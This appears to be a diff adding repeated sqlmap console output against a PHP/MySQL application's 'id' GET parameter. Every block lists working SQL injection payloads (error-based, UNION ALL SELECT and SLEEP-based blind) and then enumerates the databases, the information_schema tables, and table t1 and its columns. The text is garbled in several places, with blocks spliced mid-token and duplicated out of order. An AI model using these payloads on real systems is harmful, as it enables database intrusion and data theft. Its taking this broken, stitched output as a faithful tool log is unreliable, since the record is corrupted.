+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: information_schema
+[37 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| COLLATIONS                            |
+| COLLATION_CHARACTER_SET_APPLICABILITY |
+| COLUMNS                               |
+| COLUMN_PRIVILEGES                     |
+| ENGINES                               |
+| EVENTS                                |
+| FILES                                 |
+| GLOBAL_STATUS                         |
+| GLOBAL_VARIABLES                      |
+| INNODB_CMP                            |
+| INNODB_CMPMEM                         |
+| INNODB_CMPMEM_RESET                   |
+| INNODB_CMP_RESET                      |
+| INNODB_LOCKS                          |
+| INNODB_LOCK_WAITS                     |
+| INNODB_TRX                            |
+| KEY_COLUMN_USAGE                      |
+| PARAMETERS                            |
+| PARTITIONS                            |
+| PLUGINS                               |
+| PROCESSLIST                           |
+| PROFILING                             |
+| REFERENTIAL_CONSTRAINTS               |
+| ROUTINES                              |
+| SCHEMATA                              |
+| SCHEMA_PRIVILEGES                     |
+| SESSION_STATUS                        |
+| SESSION_VARIABLES                     |
+| STATISTICS                            |
+| TABLES                                |
+| TABLESPACES                           |
+| TABLE_CONSTRAINTS                     |
+| TABLE_PRIVILEGES                      |
+| TRIGGERS                              |
+| USER_PRIVILEGES                       |
+| VIEWS                                 |
++---------------------------------------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMsqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+wITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+Table: t1
+[4 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| f1     | int(11) |
+| f2     | int(11) |
+| f3     | int(11) |
+| f4     | int(11) |
++--------+---------+
+
+eb application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+No tables found
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMsqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+wITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+No tables found
+eb application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+Table: t1
+[4 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| f1     | int(11) |
+| f2     | int(11) |
+| f3     | int(11) |
+| f4     | int(11) |
++--------+---------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+[1 table]
++----+
+| t1 |
++----+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMsqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+wITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+No tables found
+eb application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: MySQL 5
+Database: test
+Table: t1
+[4 columns]
++--------+---------+
+| Column | Type    |
++--------+---------+
+| f1     | int(11) |
+| f2     | int(11) |
+| f3     | int(11) |
+| f4     | int(11) |
++--------+---------+
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5222 FROM(SELECT COUNT(*),CONCAT(0x71666c6671,(SELECT (CASE WHEN (5222=5222) THEN 1 ELSE 0 END)),0x71616a7071,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+    Vector: AND (SELECT [RANDNUM] FROM(SELECT COUNT(*),CONCAT('[DELIMITER_START]',([QUERY]),'[DELIMITER_STOP]',FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 4 columns
+    Payload: id=-9551 UNION ALL SELECT NULL,NULL,NULL,CONCAT(0x71666c6671,0x46416e44457453594e64,0x71616a7071)#
+    Vector:  UNION ALL SELECT NULL,NULL,NULL,[QUERY]#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+    Vector: AND [RANDNUM]=IF(([INFERENCE]),SLEEP([SLEEPTIME]),[RANDNUM])
+---
+web application technology: PHP 5.3.13, Apache 2.2.22
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] performance_schema
+[*] test
+
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
